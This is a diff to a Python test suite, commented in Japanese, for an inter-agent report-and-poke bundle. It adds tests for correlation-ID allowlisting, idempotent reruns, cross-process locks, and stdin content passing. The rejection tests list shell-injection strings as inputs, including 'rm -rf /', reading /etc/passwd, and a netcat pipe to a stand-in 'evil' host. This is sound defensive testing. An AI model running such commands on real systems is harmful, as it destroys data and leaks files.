@@ -24,8 +24,10 @@ Exit:
 
 from __future__ import annotations
 
+import hashlib
 import os
 import shutil
+import subprocess
 import sys
 import tempfile
 import traceback
@@ -45,6 +47,12 @@ from fukuincho_report_poke_bundle import (  # noqa: E402
     poke_with_ack_retry,
     report_and_poke,
     backoff_seconds,
+    validate_correlation_id,
+    _corr_id_hash,
+    _marker_path,
+    _lock_path,
+    _INBOX_WRITE_STDIN_PLACEHOLDER,
+    _INBOX_WRITE_STDIN_ENV,
     ACK_N_SEC,
     RETRY_M_MAX,
     BACKOFF_SCHEDULE_SEC,
@@ -203,7 +211,10 @@ def test_acquire_lock_blocks_parallel():
 # ════════════════════════════════════════════════════════════
 
 def test_report_insert_via_inbox_write_uses_runner():
-    """inbox_write.sh を subprocess.run 互換 runner で叩くことを確認 (FKI-NO-DUP evidence)"""
+    """inbox_write.sh を subprocess.run 互換 runner で叩くことを確認 (FKI-NO-DUP evidence)。
+    ★cycle2 S2 cure★: content は argv ($2) ではなく stdin (input=) + env で渡される。
+    $2 は placeholder __VIA_STDIN__ で空文字 reject を avoid (raw content 露出禁)。
+    """
     captured = {}
 
     class _P:
@@ -211,11 +222,9 @@ def test_report_insert_via_inbox_write_uses_runner():
         stdout = ""
         stderr = ""
 
-    def fake_runner(cmd, capture_output=False, text=False, timeout=None):
+    def fake_runner(cmd, **kw):
         captured["cmd"] = cmd
-        captured["capture_output"] = capture_output
-        captured["text"] = text
-        captured["timeout"] = timeout
+        captured.update(kw)
         return _P()
 
     result = report_insert_via_inbox_write(
@@ -231,11 +240,21 @@ def test_report_insert_via_inbox_write_uses_runner():
     assert captured["cmd"][0] == "bash"
     assert captured["cmd"][1] == "/tmp/fake_inbox_write.sh"
     assert captured["cmd"][2] == "karo-third"
-    assert captured["cmd"][3] == "test body"
+    # ★S2 cure verify★: argv 位置 $2 は placeholder、raw content は出現しない
+    assert captured["cmd"][3] == _INBOX_WRITE_STDIN_PLACEHOLDER
+    assert "test body" not in captured["cmd"], \
+        f"raw content must not be in argv (S2 cure), got cmd={captured['cmd']}"
     assert captured["cmd"][4] == "report_received"
     assert captured["cmd"][5] == "ashigaru-third-3"
     assert captured["capture_output"] is True
     assert captured["text"] is True
+    # ★S2 cure verify★: content は stdin (input=) で渡される
+    assert captured.get("input") == "test body", \
+        f"content must be passed via stdin (input=), got {captured.get('input')!r}"
+    # ★S2 cure verify★: env に INBOX_WRITE_CONTENT_STDIN=1
+    env = captured.get("env") or {}
+    assert env.get(_INBOX_WRITE_STDIN_ENV) == "1", \
+        f"env must enable stdin mode, got {env.get(_INBOX_WRITE_STDIN_ENV)!r}"
 
 
 def test_report_insert_failure_propagates_rc():
@@ -244,6 +263,7 @@ def test_report_insert_failure_propagates_rc():
         stdout = ""
         stderr = "amplification loop detected"
 
+    # ★cycle2 S2 cure★: runner sig は **kw を受ける (input=, env= が来る)
     result = report_insert_via_inbox_write(
         target_agent="x", content="y", msg_type="z", from_agent="a",
         inbox_write_path="/tmp/fake.sh",
@@ -602,8 +622,13 @@ def test_bundle_records_elapsed_sec():
 #         (report_and_poke レベルで非 fired 終端で marker file 作成されない)
 # ════════════════════════════════════════════════════════════
 
-def test_bundle_does_not_mark_poked_on_error():
-    """poke 全 attempt 失敗 → marker file 作成されない (次回再試行可)"""
+def test_bundle_marks_poked_after_insert_even_on_poke_error():
+    """★cycle2 RED-B1 cure (high)★ 順序変更: INSERT 成功直後 (poke 前) に marker 立て。
+
+    旧契約: marker は fired 時のみ → INSERT 成功 + poke error の rerun で dup-INSERT 欠陥。
+    新契約: INSERT 成功 → marker 立て → poke error/human_required でも marker 残存。
+    rerun は skipped_already_poked で INSERT 0 件 + poke 0 件 (冪等性厳守)。
+    """
     def _go(tmp):
         class _OK:
             returncode = 0
@@ -616,7 +641,7 @@ def test_bundle_does_not_mark_poked_on_error():
             stderr = "err"
 
         result = report_and_poke(
-            correlation_id="corr-err",
+            correlation_id="corr-err1",
             target_agent="karo-third",
             content="x",
             msg_type="report_received",
@@ -630,9 +655,9 @@ def test_bundle_does_not_mark_poked_on_error():
         )
         assert result.status == "error"
         assert result.poke["attempts"] == RETRY_M_MAX
-        # marker 未作成 (次回再試行可、人手介入もまだ)
-        assert already_poked("corr-err", lock_dir=tmp) is False
-    _with_tmpdir(_go)
+        # ★RED-B1 cure verify★: poke 失敗でも marker は INSERT 成功直後に立っている
+        assert already_poked("corr-err1", lock_dir=tmp) is True, \
+            "marker must persist after INSERT success even if poke errors (RED-B1 cure)"
 
 
 # ════════════════════════════════════════════════════════════
@@ -674,6 +699,393 @@ def test_log_sanitize_strips_secret_keys():
 
 
 # ════════════════════════════════════════════════════════════
+# 12. ★cycle2 fix1 (RED-S1)★: correlation_id allowlist matrix + SSH injection reject
+# ════════════════════════════════════════════════════════════
+
+def test_validate_correlation_id_accepts_safe_chars():
+    """ASCII alphanumeric + '.' '_' '-' 1〜200 字は accept"""
+    safe_ids = [
+        "bundle-1718000000-12345",
+        "report.corr.abc_123",
+        "ABC.def-456",
+        "a",                        # 1 文字下限
+        "a" * 200,                  # 200 字上限
+        "1234567890",
+        "x-y.z_w",
+    ]
+    for cid in safe_ids:
+        assert validate_correlation_id(cid) is True, \
+            f"safe id should accept: {cid!r}"
+
+
+def test_validate_correlation_id_rejects_shell_metas():
+    """shell meta character (`;` `$()` `&&` `|` `\\n` 空白 等) は完全 reject"""
+    injection_ids = [
+        "ok;rm -rf /",                       # ';' command separator
+        "ok && cat /etc/passwd",             # '&&' AND
+        "ok | nc evil.example.com 1234",     # '|' pipe
+        "$(id)",                             # '$()' command substitution
+        "`whoami`",                          # backtick command substitution
+        "ok > /tmp/evil",                    # '>' redirect
+        "ok < /etc/passwd",                  # '<' redirect
+        "ok\nrm -rf /",                      # newline
+        "ok\trm -rf /",                      # tab
+        "ok rm -rf /",                       # 空白
+        "ok\"; rm -rf /;\"",                 # 引用符 + ;
+        "ok'; rm -rf /;'",                   # single quote
+        "ok\\; rm",                          # backslash
+        "../../etc/passwd",                  # path traversal (/が無いゆえ regex に通るが、
+                                              # 末尾 '/' は disallowed token に含めず regex で reject)
+        "",                                   # 空文字
+        "a" * 201,                            # 201 字上限超
+    ]
+    for cid in injection_ids:
+        assert validate_correlation_id(cid) is False, \
+            f"injection id should reject: {cid!r}"
+
+
+def test_validate_correlation_id_rejects_non_string():
+    """str 以外 (None / int / bytes) は reject"""
+    for non_str in (None, 12345, b"bytes", ["list"], {"dict": 1}):
+        assert validate_correlation_id(non_str) is False, \
+            f"non-string should reject: {non_str!r}"
+
+
+def test_fire_poke_rejects_injection_corr_id_ssh_path():
+    """★RED-S1 cure verify★ SSH path で injection corr_id を渡すと runner は呼ばれず error"""
+    runner_called = {"n": 0}
+
+    def fake_runner(cmd, **kw):
+        runner_called["n"] += 1
+        class _P:
+            returncode = 0; stdout = ""; stderr = ""
+        return _P()
+
+    for inj in (
+        "ok;rm -rf /",
+        "$(id)",
+        "ok && cat /etc/passwd",
+        "ok | nc evil 1234",
+    ):
+        out = fire_poke_via_origin(inj, "third_pc", runner=fake_runner)
+        assert out["status"] == "error", \
+            f"injection {inj!r} should return error status, got {out['status']}"
+        assert out["rc"] == 22
+        assert "invalid correlation_id" in out["stderr"]
+    assert runner_called["n"] == 0, \
+        f"runner must NOT be invoked when corr_id is invalid, called={runner_called['n']}"
+
+
+def test_fire_poke_rejects_injection_corr_id_main_pc():
+    """★RED-S1 cure verify (defense-in-depth)★ main_pc 直接 path でも入口で reject"""
+    runner_called = {"n": 0}
+
+    def fake_runner(cmd, **kw):
+        runner_called["n"] += 1
+        class _P:
+            returncode = 0; stdout = ""; stderr = ""
+        return _P()
+
+    out = fire_poke_via_origin("ok;rm -rf /", "main_pc", runner=fake_runner)
+    assert out["status"] == "error"
+    assert out["rc"] == 22
+    assert runner_called["n"] == 0
+
+
+def test_fire_poke_ssh_uses_shlex_quote_for_corr_id():
+    """★RED-S1 cure (defense-in-depth)★ allowlist 通過後も shlex.quote で remote_cmd を escape。
+
+    Python shlex.quote の "safe set" = `[\\w@%+=:,./-]`。allowlist 通過後の corr_id
+    (ASCII alnum + '.' '_' '-') と script path ('scripts/fukuincho_desktop_poke.py') は
+    いずれも safe set 内ゆえ shlex.quote 適用後も byte 不変 (no extra single-quotes)。
+    検証は (a) remote_cmd の構造が shlex.quote 経由 composed の expected と byte 完全一致
+    (=quote 経路を確実に通っている evidence) と (b) module level で shlex import + 利用
+    確認の 2 段で行う。
+    """
+    import shlex as _shlex
+    import fukuincho_report_poke_bundle as bundle
+    captured = {}
+
+    def fake_runner(cmd, **kw):
+        captured["cmd"] = cmd
+        class _P:
+            returncode = 0; stdout = ""; stderr = ""
+        return _P()
+
+    corr = "safe.corr-id_1"
+    fire_poke_via_origin(corr, "third_pc", runner=fake_runner)
+    remote_cmd = captured["cmd"][-1]
+
+    # ★(a) 完全一致 verify★: remote_cmd は shlex.quote 経由 composed と byte for byte 一致
+    expected = (
+        f"python3 {_shlex.quote('scripts/fukuincho_desktop_poke.py')} "
+        f"--auto-poke --correlation-id {_shlex.quote(corr)}"
+    )
+    assert remote_cmd == expected, \
+        f"remote_cmd composed via shlex.quote mismatch.\n"\
+        f" expected={expected!r}\n got     ={remote_cmd!r}"
+
+    # ★(b) shlex import + 経路 evidence★: module は shlex を import + bundle source
+    # 内で shlex.quote 呼出を含む (cycle2 RED-S1 cure 記述の source-level 痕跡)
+    assert hasattr(bundle, "shlex"), "bundle module must import shlex"
+    import inspect as _inspect
+    src = _inspect.getsource(bundle.fire_poke_via_origin)
+    assert "shlex.quote" in src, \
+        "fire_poke_via_origin source must invoke shlex.quote (defense-in-depth)"
+
+
+# ════════════════════════════════════════════════════════════
+# 13. ★cycle2 fix2 (RED-B1)★: rerun dup-INSERT ゼロ verify
+# ════════════════════════════════════════════════════════════
+
+def test_bundle_rerun_after_poke_error_skips_insert_zero_dup():
+    """★RED-B1 cure verify★: INSERT 成功 + poke error → 同一 corr_id rerun で
+    INSERT 0 件 + skip 1 件 (dup-INSERT 完全防止、冪等性厳守)"""
+    def _go(tmp):
+        insert_calls = {"n": 0}
+        poke_calls = {"n": 0}
+
+        class _OK:
+            returncode = 0; stdout = ""; stderr = ""
+
+        class _Err:
+            returncode = 1; stdout = ""; stderr = "poke err"
+
+        def insert_runner(cmd, **kw):
+            insert_calls["n"] += 1
+            return _OK()
+
+        def poke_runner(cmd, **kw):
+            poke_calls["n"] += 1
+            return _Err()
+
+        # 1 回目: INSERT 成功 + poke 全 attempt error
+        r1 = report_and_poke(
+            correlation_id="corr-rerun",
+            target_agent="karo-third",
+            content="x",
+            msg_type="report_received",
+            from_agent="ashigaru-third-3",
+            origin_pc="main_pc",
+            inbox_write_path="/tmp/fake.sh",
+            lock_dir=tmp,
+            insert_runner=insert_runner,
+            poke_runner=poke_runner,
+            sleeper=lambda s: None,
+        )
+        assert r1.status == "error"
+        assert insert_calls["n"] == 1, f"1st call: INSERT once, got {insert_calls['n']}"
+        # poke は ack retry で M_MAX 回
+        assert poke_calls["n"] == RETRY_M_MAX
+        # marker は INSERT 直後に立っている (RED-B1 cure)
+        assert already_poked("corr-rerun", lock_dir=tmp) is True
+
+        # 2 回目 (rerun): 同 corr_id → INSERT 0 件 + skip
+        insert_n_before = insert_calls["n"]
+        poke_n_before = poke_calls["n"]
+        r2 = report_and_poke(
+            correlation_id="corr-rerun",
+            target_agent="karo-third",
+            content="x",
+            msg_type="report_received",
+            from_agent="ashigaru-third-3",
+            origin_pc="main_pc",
+            inbox_write_path="/tmp/fake.sh",
+            lock_dir=tmp,
+            insert_runner=insert_runner,
+            poke_runner=poke_runner,
+            sleeper=lambda s: None,
+        )
+        assert r2.status == "skipped_already_poked", \
+            f"rerun should skip, got {r2.status}"
+        # ★dup-INSERT 完全防止 verify★
+        assert insert_calls["n"] == insert_n_before, \
+            f"rerun INSERT must be 0 (RED-B1 cure), got {insert_calls['n'] - insert_n_before}"
+        assert poke_calls["n"] == poke_n_before, \
+            "rerun poke must be 0 (already skipped)"
+    _with_tmpdir(_go)
+
+
+# ════════════════════════════════════════════════════════════
+# 14. ★cycle2 fix3 (RED-G)★: lock/marker cross-platform 化 verify
+# ════════════════════════════════════════════════════════════
+
+def test_lock_dir_default_uses_tempfile_gettempdir():
+    """★RED-G cure verify★: /tmp hardcode 排除、tempfile.gettempdir 起点"""
+    from fukuincho_report_poke_bundle import _LOCK_DIR_DEFAULT
+    expected = os.path.join(tempfile.gettempdir(), "fukuincho_report_poke_bundle")
+    assert _LOCK_DIR_DEFAULT == expected, \
+        f"_LOCK_DIR_DEFAULT must be under tempfile.gettempdir, got {_LOCK_DIR_DEFAULT}"
+
+
+def test_bundle_module_imports_on_platform():
+    """★RED-G cure verify★: 本 module は POSIX/Windows いずれでも import 可能
+    (fcntl / msvcrt の lazy import wrapper が unconditional import を排除)。
+    現在の test runner platform で fcntl もしくは msvcrt のどちらかが in scope のはず。"""
+    import fukuincho_report_poke_bundle as m
+    if sys.platform == "win32":
+        assert m._fcntl is None
+        # msvcrt は Windows 標準
+    else:
+        assert m._msvcrt is None
+        assert m._fcntl is not None, "POSIX で fcntl が None なのは異常"
+
+
+# ════════════════════════════════════════════════════════════
+# 15. ★cycle2 fix4 (Q1-3 test gap)★: 真 cross-process flock verify
+# ════════════════════════════════════════════════════════════
+
+def test_acquire_lock_real_cross_process_blocks():
+    """★fix4 cure verify★: 親 process が lock を持つ間、別 process は acquire できず timeout 返却。
+    subprocess 経由で fresh Python interpreter を起動し、独立 process 空間から
+    acquire_correlation_lock を呼んで blocked であることを実証する。"""
+    def _go(tmp):
+        signal_file = os.path.join(tmp, "child_signal.txt")
+        fd = acquire_correlation_lock(
+            "xp-corr-real",
+            lock_dir=tmp,
+            timeout_sec=1.0,
+        )
+        assert fd is not None, "parent acquire must succeed"
+        try:
+            # 別 process: bundle 親 dir を sys.path に挿入し acquire 試行 (timeout 0.5s)
+            scripts_dir = os.path.dirname(HERE)
+            child_script = (
+                "import os, sys\n"
+                f"sys.path.insert(0, {scripts_dir!r})\n"
+                "from fukuincho_report_poke_bundle import acquire_correlation_lock\n"
+                f"fd = acquire_correlation_lock('xp-corr-real', lock_dir={tmp!r}, timeout_sec=0.5)\n"
+                f"open({signal_file!r}, 'w').write('blocked' if fd is None else 'acquired')\n"
+            )
+            proc = subprocess.run(
+                [sys.executable, "-c", child_script],
+                capture_output=True, text=True, timeout=10,
+            )
+            assert proc.returncode == 0, \
+                f"child must exit 0, got rc={proc.returncode} stderr={proc.stderr}"
+            assert os.path.exists(signal_file), "child must write signal file"
+            with open(signal_file) as f:
+                result = f.read()
+            assert result == "blocked", \
+                f"child must be blocked while parent holds lock, got {result!r}"
+        finally:
+            release_correlation_lock(fd)
+
+        # parent release 後は別 process が獲得可能
+        signal_file2 = os.path.join(tmp, "child_signal2.txt")
+        scripts_dir = os.path.dirname(HERE)
+        child_script2 = (
+            "import os, sys\n"
+            f"sys.path.insert(0, {scripts_dir!r})\n"
+            "from fukuincho_report_poke_bundle import acquire_correlation_lock, release_correlation_lock\n"
+            f"fd = acquire_correlation_lock('xp-corr-real', lock_dir={tmp!r}, timeout_sec=1.0)\n"
+            f"open({signal_file2!r}, 'w').write('blocked' if fd is None else 'acquired')\n"
+            "release_correlation_lock(fd)\n"
+        )
+        proc2 = subprocess.run(
+            [sys.executable, "-c", child_script2],
+            capture_output=True, text=True, timeout=10,
+        )
+        assert proc2.returncode == 0, \
+            f"second child must exit 0, got rc={proc2.returncode} stderr={proc2.stderr}"
+        with open(signal_file2) as f:
+            result2 = f.read()
+        assert result2 == "acquired", \
+            f"second child must acquire after parent release, got {result2!r}"
+    _with_tmpdir(_go)
+
+
+# ════════════════════════════════════════════════════════════
+# 16. ★cycle2 fix5 (B2)★: marker path full hash (truncate collision 排除) verify
+# ════════════════════════════════════════════════════════════
+
+def test_marker_and_lock_paths_use_full_sha256_hash():
+    """★B2 cure verify★: marker/lock basename は sha256(corr_id) hex (truncation なし)"""
+    cid = "some-correlation-id.with.dots_and-dashes"
+    expected_hash = hashlib.sha256(cid.encode("utf-8")).hexdigest()
+    assert _corr_id_hash(cid) == expected_hash
+    mp = _marker_path("/tmp/dummy", cid)
+    lp = _lock_path("/tmp/dummy", cid)
+    assert mp.endswith(f"{expected_hash}.poked"), f"got {mp}"
+    assert lp.endswith(f"{expected_hash}.lock"), f"got {lp}"
+
+
+def test_marker_distinct_corr_ids_no_collision_even_long_shared_prefix():
+    """★B2 cure verify★: 共通 prefix 200 字超の 2 corr_id は別 marker basename を持つ
+    (旧版は truncate(200) で誤 collision、新版は hash で完全 distinct)"""
+    prefix = "x" * 250
+    cid_a = prefix + "_AAA"
+    cid_b = prefix + "_BBB"
+    assert _marker_path("/tmp/d", cid_a) != _marker_path("/tmp/d", cid_b), \
+        "long shared prefix corr_ids must produce distinct marker paths (B2 cure)"
+    assert _lock_path("/tmp/d", cid_a) != _lock_path("/tmp/d", cid_b), \
+        "long shared prefix corr_ids must produce distinct lock paths (B2 cure)"
+
+
+# ════════════════════════════════════════════════════════════
+# 17. ★cycle2 fix5 (S2)★: inbox_write.sh real stdin path verify (process inspection cure)
+# ════════════════════════════════════════════════════════════
+
+def test_inbox_write_sh_stdin_path_real_subprocess():
+    """★S2 cure verify★: 実 inbox_write.sh script を起動して stdin 経路 content
+    受領を実証 (mock 経路でなく実シェル動作)。Self-send guard を利用して
+    Supabase / cross-PC bridge を起動させずに validate 段階で reject させ、
+    bash の CONTENT 上書きが効いていることだけを観測する。"""
+    inbox_write = os.path.join(os.path.dirname(HERE), "inbox_write.sh")
+    if not os.path.exists(inbox_write):
+        # script 不在 (極稀): 環境前提崩れとして fail
+        raise AssertionError(f"inbox_write.sh not found at {inbox_write}")
+
+    env = dict(os.environ)
+    env[_INBOX_WRITE_STDIN_ENV] = "1"
+    content_payload = "STDIN_DELIVERED_CONTENT_marker_XYZ"
+    # Self-send で reject されるが、reject に至る前に CONTENT が空でないこと =
+    # bash が stdin から content を取得していること を意味する
+    proc = subprocess.run(
+        [
+            "bash", inbox_write,
+            "_self_send_x",
+            _INBOX_WRITE_STDIN_PLACEHOLDER,
+            "report_received",
+            "_self_send_x",  # FROM == TARGET → self-send guard で reject
+        ],
+        input=content_payload,
+        capture_output=True, text=True, timeout=10,
+        env=env,
+    )
+    assert proc.returncode != 0, "self-send must reject (rc!=0)"
+    # self-send guard message が出ていれば CONTENT 空 validate を通っている =
+    # stdin path が動作している evidence
+    assert "self-send detected" in proc.stderr, \
+        f"expected self-send rejection (means stdin CONTENT was read), got: {proc.stderr!r}"
+    # 「Usage: inbox_write.sh」(空 validate fail) は出てはならない
+    assert "Usage: inbox_write.sh" not in proc.stderr, \
+        f"empty-content validate triggered — stdin path NOT working: {proc.stderr!r}"
+
+
+def test_inbox_write_sh_stdin_env_unset_keeps_argv_compat():
+    """★S2 cure backward compat verify★: env 未設定なら従来通り $2 を CONTENT として使う
+    (既存 caller の argv 経路に影響しない)"""
+    inbox_write = os.path.join(os.path.dirname(HERE), "inbox_write.sh")
+    env = dict(os.environ)
+    env.pop(_INBOX_WRITE_STDIN_ENV, None)
+    # argv $2 にダミー content を直接渡し、self-send で reject させる
+    proc = subprocess.run(
+        [
+            "bash", inbox_write,
+            "_self_send_y", "argv-content-not-stdin",
+            "report_received", "_self_send_y",
+        ],
+        capture_output=True, text=True, timeout=10,
+        env=env,
+    )
+    assert proc.returncode != 0
+    assert "self-send detected" in proc.stderr
+    # Usage validate も出ない (=argv content が読まれた)
+    assert "Usage: inbox_write.sh" not in proc.stderr
+
+
+# ════════════════════════════════════════════════════════════
 # main
 # ════════════════════════════════════════════════════════════
 
@@ -710,12 +1122,56 @@ CASES = [
     ("(iii) bundle marks poked on fired", test_bundle_marks_poked_on_fired),
     # (i) bundle level latency
     ("(i) bundle records elapsed_sec", test_bundle_records_elapsed_sec),
-    # (iv) safety: error → marker not set
-    ("(iv) bundle does not mark poked on error", test_bundle_does_not_mark_poked_on_error),
+    # (iv) safety: ★cycle2 RED-B1 cure★ marker IS set after INSERT success even on poke error
+    ("(iv,cycle2) bundle marks poked after insert even on poke error",
+     test_bundle_marks_poked_after_insert_even_on_poke_error),
     # FKI-NO-DUP evidence
     ("FKI-NO-DUP reuses ae8083dd engine", test_fki_no_dup_reuses_ae8083dd_engine),
     # log sanitize
     ("log_sanitize strips secret keys", test_log_sanitize_strips_secret_keys),
+    # ──────────────────────────────────────────────────────────
+    # cycle2 fix1 (RED-S1 SSH injection cure)
+    # ──────────────────────────────────────────────────────────
+    ("cycle2 fix1: validate_correlation_id accepts safe chars",
+     test_validate_correlation_id_accepts_safe_chars),
+    ("cycle2 fix1: validate_correlation_id rejects shell metas",
+     test_validate_correlation_id_rejects_shell_metas),
+    ("cycle2 fix1: validate_correlation_id rejects non-string",
+     test_validate_correlation_id_rejects_non_string),
+    ("cycle2 fix1: fire_poke rejects injection corr_id (SSH path)",
+     test_fire_poke_rejects_injection_corr_id_ssh_path),
+    ("cycle2 fix1: fire_poke rejects injection corr_id (main_pc path)",
+     test_fire_poke_rejects_injection_corr_id_main_pc),
+    ("cycle2 fix1: fire_poke SSH uses shlex.quote for corr_id",
+     test_fire_poke_ssh_uses_shlex_quote_for_corr_id),
+    # ──────────────────────────────────────────────────────────
+    # cycle2 fix2 (RED-B1 dup-INSERT rerun cure)
+    # ──────────────────────────────────────────────────────────
+    ("cycle2 fix2: bundle rerun after poke error skips INSERT (dup-INSERT zero)",
+     test_bundle_rerun_after_poke_error_skips_insert_zero_dup),
+    # ──────────────────────────────────────────────────────────
+    # cycle2 fix3 (RED-G cross-platform cure)
+    # ──────────────────────────────────────────────────────────
+    ("cycle2 fix3: lock_dir default uses tempfile.gettempdir",
+     test_lock_dir_default_uses_tempfile_gettempdir),
+    ("cycle2 fix3: bundle module imports on platform (fcntl/msvcrt wrapper)",
+     test_bundle_module_imports_on_platform),
+    # ──────────────────────────────────────────────────────────
+    # cycle2 fix4 (Q1-3 test gap: real cross-process flock)
+    # ──────────────────────────────────────────────────────────
+    ("cycle2 fix4: acquire_lock real cross-process blocks",
+     test_acquire_lock_real_cross_process_blocks),
+    # ──────────────────────────────────────────────────────────
+    # cycle2 fix5 (B2 full hash + S2 stdin content)
+    # ──────────────────────────────────────────────────────────
+    ("cycle2 fix5 (B2): marker/lock paths use full sha256 hash",
+     test_marker_and_lock_paths_use_full_sha256_hash),
+    ("cycle2 fix5 (B2): no truncation collision on long shared prefix",
+     test_marker_distinct_corr_ids_no_collision_even_long_shared_prefix),
+    ("cycle2 fix5 (S2): inbox_write.sh real stdin path",
+     test_inbox_write_sh_stdin_path_real_subprocess),
+    ("cycle2 fix5 (S2): inbox_write.sh argv backward compat",
+     test_inbox_write_sh_stdin_env_unset_keeps_argv_compat),
 ]
 
 
